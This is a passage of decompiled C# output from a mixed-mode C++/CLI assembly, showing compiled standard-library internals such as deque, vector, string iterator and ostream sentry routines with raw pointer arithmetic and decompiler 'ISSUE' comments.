    [In] deque\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E* obj0)
  {
    uint num1 = (uint) *(int*) ((IntPtr) obj0 + 28);
    if (num1 == 0U)
      return;
    uint num2 = (uint) ((int) num1 + *(int*) ((IntPtr) obj0 + 24) - 1);
    uint num3 = (uint) *(int*) ((IntPtr) obj0 + 20);
    if (num3 <= num2)
      num2 -= num3;
    \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D((basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E*) *(int*) ((int) num2 * 4 + *(int*) ((IntPtr) obj0 + 16)));
    *(int*) ((IntPtr) obj0 + 28) = *(int*) ((IntPtr) obj0 + 28) - 1;
    if (*(int*) ((IntPtr) obj0 + 28) != 0)
      return;
    *(int*) ((IntPtr) obj0 + 24) = 0;
  }

  internal static unsafe void std\u002Edeque\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E\u002E_Tidy(
    [In] deque\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E* obj0)
  {
    deque\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E* stdAllocatorWcharTPtr1 = (deque\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E*) ((IntPtr) obj0 + 28);
    while (*(int*) stdAllocatorWcharTPtr1 != 0)
      \u003CModule\u003E.std\u002Edeque\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E\u002Epop_back(obj0);
    uint num1 = (uint) *(int*) ((IntPtr) obj0 + 20);
    if (0U < num1)
    {
      deque\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E* stdAllocatorWcharTPtr2 = (deque\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E*) ((IntPtr) obj0 + 16);
      do
      {
        --num1;
        int num2 = (int) num1 * 4 + *(int*) stdAllocatorWcharTPtr2;
        if (*(int*) num2 != 0)
          \u003CModule\u003E.delete((void*) *(int*) num2);
      }
      while (num1 > 0U);
    }
    int num3 = *(int*) ((IntPtr) obj0 + 16);
    if (num3 != 0)
      \u003CModule\u003E.delete((void*) num3);
    *(int*) ((IntPtr) obj0 + 20) = 0;
    *(int*) ((IntPtr) obj0 + 16) = 0;
  }

  internal static unsafe sbyte std\u002Eistreambuf_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E\u002A(
    [In] istreambuf_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* obj0)
  {
    if (*(byte*) ((IntPtr) obj0 + 4) == (byte) 0)
    {
      int num = (int) \u003CModule\u003E.std\u002Eistreambuf_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E_Peek(obj0);
    }
    return *(sbyte*) ((IntPtr) obj0 + 5);
  }

  internal static unsafe istreambuf_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* std\u002Eistreambuf_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E\u002B\u002B(
    [In] istreambuf_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* obj0)
  {
    uint num = (uint) *(int*) obj0;
    if (num != 0U && !\u003CModule\u003E.std\u002Echar_traits\u003Cchar\u003E\u002Eeq_int_type(&-1, &\u003CModule\u003E.std\u002Ebasic_streambuf\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Esbumpc((basic_streambuf\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) num)))
    {
      *(sbyte*) ((IntPtr) obj0 + 4) = (sbyte) 0;
    }
    else
    {
      *(int*) obj0 = 0;
      *(sbyte*) ((IntPtr) obj0 + 4) = (sbyte) 1;
    }
    return obj0;
  }

  internal static unsafe char* std\u002E_String_iterator\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u002A(
    [In] _String_iterator\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj0)
  {
    int num;
    switch ((uint) *(int*) obj0)
    {
      case 0:
        num = 0;
        break;
      case 4294967292:
label_7:
        return (char*) *(int*) ((IntPtr) obj0 + 4);
      default:
        num = 1;
        break;
    }
    if ((byte) num == (byte) 0)
      \u003CModule\u003E._invalid_parameter_noinfo();
    if ((UIntPtr) *(int*) ((IntPtr) obj0 + 4) >= (UIntPtr) (*(int*) (*(int*) obj0 + 20) * 2) + (UIntPtr) \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E_Myptr((basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E*) *(int*) obj0))
    {
      \u003CModule\u003E._invalid_parameter_noinfo();
      goto label_7;
    }
    else
      goto label_7;
  }

  internal static unsafe basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E.sentry* std\u002Ebasic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Esentry\u002E\u007Bctor\u007D(
    [In] basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E.sentry* obj0,
    basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* _Ostr)
  {
    *(int*) obj0 = (int) _Ostr;
    if ((IntPtr) \u003CModule\u003E.std\u002Ebasic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Erdbuf((basic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) (*(int*) (*(int*) _Ostr + 4) + (IntPtr) _Ostr)) != IntPtr.Zero)
    {
      int num = *(int*) obj0;
      \u003CModule\u003E.std\u002Ebasic_streambuf\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E_Lock(\u003CModule\u003E.std\u002Ebasic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Erdbuf((basic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) (*(int*) (*(int*) num + 4) + num)));
    }
    // ISSUE: fault handler
    try
    {
      if (\u003CModule\u003E.std\u002Eios_base\u002Egood((ios_base*) (*(int*) (*(int*) _Ostr + 4) + (IntPtr) _Ostr)) && (IntPtr) \u003CModule\u003E.std\u002Ebasic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Etie((basic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) (*(int*) (*(int*) _Ostr + 4) + (IntPtr) _Ostr)) != IntPtr.Zero)
        \u003CModule\u003E.std\u002Ebasic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Eflush(\u003CModule\u003E.std\u002Ebasic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Etie((basic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) (*(int*) (*(int*) _Ostr + 4) + (IntPtr) _Ostr)));
      *(sbyte*) ((IntPtr) obj0 + 4) = (sbyte) \u003CModule\u003E.std\u002Eios_base\u002Egood((ios_base*) (*(int*) (*(int*) _Ostr + 4) + (IntPtr) _Ostr));
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E_Sentry_base\u002E\u007Bdtor\u007D), (void*) obj0);
    }
    return obj0;
  }

  internal static unsafe void std\u002Ebasic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Esentry\u002E\u007Bdtor\u007D(
    [In] basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E.sentry* obj0)
  {
    // ISSUE: fault handler
    try
    {
      if (!\u003CModule\u003E.std\u002Euncaught_exception())
        \u003CModule\u003E.std\u002Ebasic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E_Osfx((basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) *(int*) obj0);
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E_Sentry_base\u002E\u007Bdtor\u007D), (void*) obj0);
    }
    int num1 = *(int*) obj0;
    if ((IntPtr) \u003CModule\u003E.std\u002Ebasic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Erdbuf((basic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) (*(int*) (*(int*) num1 + 4) + num1)) == IntPtr.Zero)
      return;
    int num2 = *(int*) obj0;
    \u003CModule\u003E.std\u002Ebasic_streambuf\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E_Unlock(\u003CModule\u003E.std\u002Ebasic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Erdbuf((basic_ios\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) (*(int*) (*(int*) num2 + 4) + num2)));
  }

  [return: MarshalAs(UnmanagedType.U1)]
  internal static unsafe bool std\u002E_String_const_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u0021\u003D(
    [In] _String_const_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj0,
    _String_const_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* _Right)
  {
    uint num1 = (uint) *(int*) obj0;
    int num2;
    switch (num1)
    {
      case 0:
        num2 = 0;
        break;
      case 4294967292:
label_5:
        return *(int*) ((IntPtr) obj0 + 4) != *(int*) ((IntPtr) _Right + 4);
      default:
        num2 = 1;
        break;
    }
    if ((byte) num2 == (byte) 0 || (int) num1 != *(int*) _Right)
    {
      \u003CModule\u003E._invalid_parameter_noinfo();
      goto label_5;
    }
    else
      goto label_5;
  }

  internal static unsafe _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Eerase(
    [In] vector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj0,
    [In] _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj1,
    _Vector_const_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E _First_arg,
    _Vector_const_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E _Last_arg)
  {
    _Vector_const_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT1 = _First_arg;
    *(int*) obj1 = 0;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    if ((IntPtr) obj0 == IntPtr.Zero || (uint) *(int*) ((IntPtr) obj0 + 12) > (uint) ^(int&) ((IntPtr) &_First_arg + 4) || (uint) ^(int&) ((IntPtr) &_First_arg + 4) > (uint) *(int*) ((IntPtr) obj0 + 16))
      \u003CModule\u003E._invalid_parameter_noinfo();
    *(int*) obj1 = *(int*) obj0;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    *(int*) ((IntPtr) obj1 + 4) = ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 4);
    _Vector_const_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT2 = _Last_arg;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    if ((uint) *(int*) ((IntPtr) obj0 + 12) > (uint) ^(int&) ((IntPtr) &_Last_arg + 4) || (uint) ^(int&) ((IntPtr) &_Last_arg + 4) > (uint) *(int*) ((IntPtr) obj0 + 16))
      \u003CModule\u003E._invalid_parameter_noinfo();
    _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT3;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ref stdAllocatorWcharT3 = *(int*) obj0;
    uint num1 = (uint) *(int*) obj1;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    if ((num1 != 0U ? 1 : 0) == 0 || (int) num1 != ^(int&) ref stdAllocatorWcharT3)
      \u003CModule\u003E._invalid_parameter_noinfo();
    uint num2 = (uint) *(int*) ((IntPtr) obj1 + 4);
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    if ((int) num2 != ^(int&) ((IntPtr) &stdAllocatorWcharT2 + 4))
    {
      char* chPtr1 = (char*) num2;
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      int num3 = *(int*) ((IntPtr) obj0 + 16) - ^(int&) ((IntPtr) &stdAllocatorWcharT2 + 4) >> 1;
      int num4 = num3 * 2;
      char* chPtr2 = (char*) (num4 + (IntPtr) chPtr1);
      if (num3 > 0)
      {
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        \u003CModule\u003E.memmove_s((void*) chPtr1, (uint) num4, (void*) ^(int&) ((IntPtr) &stdAllocatorWcharT2 + 4), (uint) num4);
      }
      *(int*) ((IntPtr) obj0 + 16) = (int) chPtr2;
    }
    return obj1;
  }

  internal static unsafe void std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E_Insert_n(
    [In] vector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj0,
    _Vector_const_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E _Where,
    uint _Count,
    char* _Val)
  {
    // ISSUE: untyped stack allocation
    int num1 = (int) __untypedstackalloc(\u003CModule\u003E.__CxxQueryExceptionSize());
    uint num2 = (uint) *(int*) ((IntPtr) obj0 + 12);
    int num3 = num2 != 0U ? *(int*) ((IntPtr) obj0 + 20) - (int) num2 >> 1 : 0;
    if (_Count == 0U)
      return;
    int num4 = (int) \u003CModule\u003E.std\u002Eallocator\u003Cwchar_t\u003E\u002Emax_size((allocator\u003Cwchar_t\u003E*) ((IntPtr) obj0 + 8));
    int num5 = *(int*) ((IntPtr) obj0 + 16);
    int num6 = num5 - *(int*) ((IntPtr) obj0 + 12) >> 1;
    int num7 = num6;
    if ((uint) (num4 - num7) < _Count)
      \u003CModule\u003E.std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E_Xlen();
    uint exceptionCode;
    if ((uint) num3 < (uint) num6 + _Count)
    {
      uint num8 = (uint) num3 >> 1;
      uint num9 = \u003CModule\u003E.std\u002Eallocator\u003Cwchar_t\u003E\u002Emax_size((allocator\u003Cwchar_t\u003E*) ((IntPtr) obj0 + 8)) - num8 >= (uint) num3 ? num8 + (uint) num3 : 0U;
      uint num10 = num9;
      uint num11 = _Count + (uint) (*(int*) ((IntPtr) obj0 + 16) - *(int*) ((IntPtr) obj0 + 12) >> 1);
      if (num9 < num11)
        num10 = num11;
      char* chPtr = \u003CModule\u003E.std\u002Eallocator\u003Cwchar_t\u003E\u002Eallocate((allocator\u003Cwchar_t\u003E*) ((IntPtr) obj0 + 8), num10);
      try
      {
        vector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* stdAllocatorWcharTPtr = obj0;
        int _First = *(int*) ((IntPtr) stdAllocatorWcharTPtr + 12);
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        int _Last = ^(int&) ((IntPtr) &_Where + 4);
        char* _Ptr1 = chPtr;
        char* _Ptr2 = \u003CModule\u003E.std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E_Umove\u003Cwchar_t\u0020\u002A\u003E(stdAllocatorWcharTPtr, (char*) _First, (char*) _Last, _Ptr1);
        char* _Ptr3 = \u003CModule\u003E.std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E_Ufill(obj0, _Ptr2, _Count, _Val);
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        \u003CModule\u003E.std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E_Umove\u003Cwchar_t\u0020\u002A\u003E(obj0, (char*) ^(int&) ((IntPtr) &_Where + 4), (char*) *(int*) ((IntPtr) obj0 + 16), _Ptr3);
      }
      catch (Exception ex1) when (
      {
        // ISSUE: unable to correctly present filter
        exceptionCode = (uint) Marshal.GetExceptionCode();
        if (\u003CModule\u003E.__CxxExceptionFilter((void*) Marshal.GetExceptionPointers(), (void*) 0, 0, (void*) 0) != 0)
        {
          SuccessfulFiltering;
        }
        else
          throw;
      }
      )
      {
        uint num12 = 0;
        \u003CModule\u003E.__CxxRegisterExceptionObject((void*) Marshal.GetExceptionPointers(), (void*) num1);
        try
        {
          try
          {
            \u003CModule\u003E.std\u002Eallocator\u003Cwchar_t\u003E\u002Edeallocate((allocator\u003Cwchar_t\u003E*) ((IntPtr) obj0 + 8), chPtr, num10);
            \u003CModule\u003E._CxxThrowException((void*) 0, (_s__ThrowInfo*) 0);
          }
          catch (Exception ex2) when (
          {
            // ISSUE: unable to correctly present filter
            num12 = (uint) \u003CModule\u003E.__CxxDetectRethrow((void*) Marshal.GetExceptionPointers());
            if (num12 != 0U)
            {
              SuccessfulFiltering;
            }
            else
              throw;
          }
          )
          {
          }
          if (num12 != 0U)
            throw;
        }
        finally
        {
          \u003CModule\u003E.__CxxUnregisterExceptionObject((void*) num1, (int) num12);
        }
      }
      uint num13 = (uint) *(int*) ((IntPtr) obj0 + 12);
      _Count = (uint) (*(int*) ((IntPtr) obj0 + 16) - (int) num13 >> 1) + _Count;
      if (num13 != 0U)
        \u003CModule\u003E.std\u002Eallocator\u003Cwchar_t\u003E\u002Edeallocate((allocator\u003Cwchar_t\u003E*) ((IntPtr) obj0 + 8), (char*) num13, (uint) (*(int*) ((IntPtr) obj0 + 20) - (int) num13 >> 1));
      *(int*) ((IntPtr) obj0 + 20) = (int) ((int) num10 * 2 + (IntPtr) chPtr);
      *(int*) ((IntPtr) obj0 + 16) = (int) ((int) _Count * 2 + (IntPtr) chPtr);
      *(int*) ((IntPtr) obj0 + 12) = (int) chPtr;
    }
    else
    {
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      if ((uint) (num5 - ^(int&) ((IntPtr) &_Where + 4) >> 1) < _Count)
      {
        char ch = *_Val;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        \u003CModule\u003E.std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E_Umove\u003Cwchar_t\u0020\u002A\u003E(obj0, (char*) ^(int&) ((IntPtr) &_Where + 4), (char*) num5, (char*) ((int) _Count * 2 + ^(int&) ((IntPtr) &_Where + 4)));
        try
        {
          int _Ptr = *(int*) ((IntPtr) obj0 + 16);
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          \u003CModule\u003E.std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E_Ufill(obj0, (char*) _Ptr, _Count - (uint) (_Ptr - ^(int&) ((IntPtr) &_Where + 4) >> 1), &ch);
        }
        catch (Exception ex3) when (
        {
          // ISSUE: unable to correctly present filter
          exceptionCode = (uint) Marshal.GetExceptionCode();
          if (\u003CModule\u003E.__CxxExceptionFilter((void*) Marshal.GetExceptionPointers(), (void*) 0, 0, (void*) 0) != 0)
          {
            SuccessfulFiltering;
          }
          else
            throw;
        }
        )
        {
          uint num14 = 0;
          \u003CModule\u003E.__CxxRegisterExceptionObject((void*) Marshal.GetExceptionPointers(), (void*) num1);
          try
          {
            try
            {
              \u003CModule\u003E._CxxThrowException((void*) 0, (_s__ThrowInfo*) 0);
            }
            catch (Exception ex4) when (
            {
              // ISSUE: unable to correctly present filter
              num14 = (uint) \u003CModule\u003E.__CxxDetectRethrow((void*) Marshal.GetExceptionPointers());
              if (num14 != 0U)
              {
                SuccessfulFiltering;
              }
              else
                throw;
            }
            )
            {
            }
            if (num14 != 0U)
              throw;
          }
          finally
          {
            \u003CModule\u003E.__CxxUnregisterExceptionObject((void*) num1, (int) num14);
          }
        }
        int num15 = (int) _Count * 2;
        *(int*) ((IntPtr) obj0 + 16) = *(int*) ((IntPtr) obj0 + 16) + num15;
        char* chPtr1 = (char*) (*(int*) ((IntPtr) obj0 + 16) - num15);
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        char* chPtr2 = (char*) ^(int&) ((IntPtr) &_Where + 4);
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        if ((IntPtr) ^(int&) ((IntPtr) &_Where + 4) == (IntPtr) chPtr1)
          return;
        do
        {
          *chPtr2 = ch;
          ++chPtr2;
        }
        while (chPtr2 != chPtr1);
      }
      else
      {
        char ch = *_Val;
        char* chPtr3 = (char*) num5;
        int num16 = (int) _Count * 2;
        char* chPtr4 = (char*) ((IntPtr) chPtr3 - num16);
        *(int*) ((IntPtr) obj0 + 16) = (int) \u003CModule\u003E.std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E_Umove\u003Cwchar_t\u0020\u002A\u003E(obj0, chPtr4, chPtr3, (char*) num5);
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        \u003CModule\u003E.stdext\u002E_Unchecked_move_backward\u003Cwchar_t\u0020\u002A\u002Cwchar_t\u0020\u002A\u003E((char*) ^(int&) ((IntPtr) &_Where + 4), chPtr4, chPtr3);
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        char* chPtr5 = (char*) (num16 + ^(int&) ((IntPtr) &_Where + 4));
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        char* chPtr6 = (char*) ^(int&) ((IntPtr) &_Where + 4);
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        if ((IntPtr) ^(int&) ((IntPtr) &_Where + 4) == (IntPtr) chPtr5)
          return;
        do
        {
          *chPtr6 = ch;
          ++chPtr6;
        }
        while (chPtr6 != chPtr5);
      }
    }
  }

  internal static unsafe void std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E_Xlen()
  {
    basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar;
    \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_0BD\u0040OLBABOEK\u0040vector\u003F\u0024DMT\u003F\u0024DO\u003F5too\u003F5long\u003F\u0024AA\u0040);
    // ISSUE: fault handler
    try
    {
      length_error lengthError;
      \u003CModule\u003E.std\u002Eexception\u002E\u007Bctor\u007D((exception*) &lengthError);
      // ISSUE: fault handler
      try
      {
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ref lengthError = (int) &\u003CModule\u003E.\u003F\u003F_7logic_error\u0040std\u0040\u00406B\u0040;
        \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D((basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E*) ((IntPtr) &lengthError + 12), &stdAllocatorChar);
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
